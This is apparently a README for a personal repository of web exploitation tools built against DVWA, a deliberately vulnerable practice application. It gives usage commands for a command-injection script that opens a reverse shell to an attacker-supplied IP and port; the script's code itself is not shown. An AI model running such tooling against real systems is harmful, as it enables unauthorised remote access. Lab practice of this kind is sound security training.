# Web Exploitation Tools

This repository contains a collection of web exploitation tools that I have developed to target vulnerabilities in the DVWA application

## Command Injection RCE (CInjectionRCE.py)

The Command Injection RCE tool allows you to test for command injection vulnerabilities and perform Remote Code Execution (RCE) on a target system.

### Usage

To use the Command Injection RCE tool, follow these steps:

```bash
python CInjectionRCE.py -u <URL> -p <Revershell Port> -i <Your IP>
```

Replace the <URL> with the target URL of the vulnerable application, <Revershell Port> with the desired port for the reverse shell connection, and <Your IP> with your IP address.  
  
  
```bash
  python CInjectionRCE.py -u http://127.0.0.1/vulnerabilities/exec/ -p 1234 -i 192.168.45.193
```

This command will run the script against the specified target URL, using port 1234 for the reverse shell connection, and IP address 192.168.45.193.


